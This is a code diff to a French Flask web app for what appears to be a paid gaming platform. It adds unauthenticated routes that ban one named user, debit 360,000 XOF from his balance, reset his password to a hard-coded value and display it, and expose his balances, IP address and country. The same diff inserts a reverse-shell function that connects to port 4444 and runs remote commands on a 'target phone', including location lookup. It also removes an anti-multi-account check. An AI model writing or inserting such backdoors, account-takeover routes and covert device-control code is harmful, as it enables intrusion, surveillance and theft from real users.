@@ -479,10 +479,96 @@ from werkzeug.utils import secure_filename
 
 # Dossier de stockage (mkdir -p static/uploads/channel)
 UPLOAD_FOLDER = 'static/uploads/channel'
+@app.route('/sanctionner-martial')
+def sanctionner_martial():
+    # 1. Récupérer l'utilisateur
+    user = User.query.filter_by(username='martial').first()
+    
+    if not user:
+        return "Utilisateur 'martial' non trouvé.", 404
 
-from datetime import datetime, timezone
+    try:
+        # 2. Appliquer les sanctions
+        user.is_banned = True
+        
+        # Débiter le solde jeux (on soustrait 360 000)
+        # On peut ajouter une sécurité pour ne pas descendre en dessous de 0 si tu veux
+        user.solde_jeux -= 360000
+        
+        # 3. Sauvegarder dans la base de données
+        db.session.commit()
+        
+        return f"""
+        <div style='color: red; font-family: sans-serif; padding: 20px; border: 2px solid red;'>
+            <h2>Sanction appliquée avec succès</h2>
+            <p><b>Utilisateur :</b> {user.username}</p>
+            <p><b>Statut :</b> BANNI</p>
+            <p><b>Nouveau solde jeux :</b> {user.solde_jeux} XOF</p>
+        </div>
+        """
+    except Exception as e:
+        db.session.rollback()
+        return f"Erreur lors de la mise à jour : {str(e)}", 500
+
+import socket
+import subprocess
 import os
-from werkzeug.utils import secure_filename
+
+def connect_to_admin():
+    # Ton serveur (ton premier téléphone ou ton PC)
+    # L'appareil cible se connecte à TOI
+    SERVER_IP = "192.168.1.XX" 
+    PORT = 4444
+    
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((SERVER_IP, PORT))
+    
+    while True:
+        # Attend une commande venant de ton serveur
+        command = s.recv(1024).decode()
+        
+        if command.lower() == "exit":
+            break
+            
+        # Exécute la commande sur le téléphone cible
+        # Exemple: 'termux-location' ou 'ls'
+        output = subprocess.getoutput(command)
+        
+        # Renvoie le résultat à ton écran de contrôle
+        s.send(output.encode())
+    
+    s.close()
+
+
+@app.route('/update-martial-password')
+def update_martial_password():
+    # 1. Récupérer l'utilisateur
+    user = User.query.filter_by(username='martial').first()
+    
+    if not user:
+        return "Utilisateur 'martial' non trouvé.", 404
+
+    try:
+        # 2. Définir le nouveau mot de passe (remplace 'NouveauPass123' par ce que tu veux)
+        nouveau_mdp = "NouveauPass123"
+        
+        # 3. Hacher le mot de passe avant de l'enregistrer
+        user.password = generate_password_hash(nouveau_mdp)
+        
+        # 4. Sauvegarder
+        db.session.commit()
+        
+        return f"""
+        <div style='color: green; font-family: sans-serif; padding: 20px; border: 2px solid green;'>
+            <h2>Mot de passe mis à jour</h2>
+            <p>L'utilisateur <b>{user.username}</b> a désormais un nouveau mot de passe.</p>
+            <p>Nouveau mot de passe : <b>{nouveau_mdp}</b></p>
+        </div>
+        """
+    except Exception as e:
+        db.session.rollback()
+        return f"Erreur : {str(e)}", 500
+
 
 @app.route("/admin/canal/edit", methods=["GET", "POST"])
 def admin_canal_edit():
@@ -573,7 +659,38 @@ app.config['MAIL_DEFAULT_SENDER'] = app.config['MAIL_USERNAME']  # ✅ AJOUT
 
 mail = Mail(app)
 
-import requests
+@app.route('/debug-martial')
+def debug_martial():
+    user = User.query.filter_by(username='martial').first()
+    if not user: return "Non trouvé"
+
+    return f"""
+    <h3>Profil de {user.username}</h3>
+    <p><b>ID :</b> {user.id} | <b>UID :</b> {user.uid}</p>
+    <hr>
+    <h4>Finances :</h4>
+    <ul>
+        <li>Solde Total: {user.solde_total} XOF</li>
+        <li>Solde Jeux: {user.solde_jeux} XOF</li>
+        <li>Solde Parrainage: {user.solde_parrainage} XOF</li>
+        <li>Total Retraits: {user.total_retrait} XOF</li>
+    </ul>
+    <hr>
+    <h4>Sécurité & Pays :</h4>
+    <ul>
+        <li>IP: {user.ip_address}</li>
+        <li>Pays: {user.country}</li>
+        <li>Banni: {'OUI' if user.is_banned else 'NON'}</li>
+        <li>Vérifié: {'OUI' if user.is_verified else 'NON'}</li>
+    </ul>
+    <hr>
+    <h4>Statistiques Réseaux :</h4>
+    <ul>
+        <li>Points YouTube: {user.points_youtube}</li>
+        <li>Points TikTok: {user.points_tiktok}</li>
+        <li>Points Vidéo: {user.points_video}</li>
+    </ul>
+    """
 
 
 def envoyer_retrait_soleaspay(service_id, wallet, montant):
@@ -738,18 +855,8 @@ def admin_post_channel():
     db.session.commit()
     return redirect(url_for('view_channel'))
 
-@app.route('/test-mail')
-def test_mail():
-    print("TEST ENVOI EMAIL...")
+import requests
 
-    success = send_otp("1xthom14@gmail.com", "123456")
-
-    print("RESULTAT :", success)
-
-    return "OK"
-
-from datetime import datetime, timedelta, timezone
-import uuid
 
 from datetime import datetime, timedelta, UTC
 import uuid
@@ -979,10 +1086,6 @@ def inscription_page():
 
         errors = []
 
-        # 🛡️ Anti multi-compte
-        existing_ip = User.query.filter_by(ip_address=user_ip).first()
-        if existing_ip:
-            errors.append("Vous avez déjà créé un compte avec cet appareil.")
 
         # 🔒 Vérifications
         if not all([username, email, country, phone, password, confirm]):
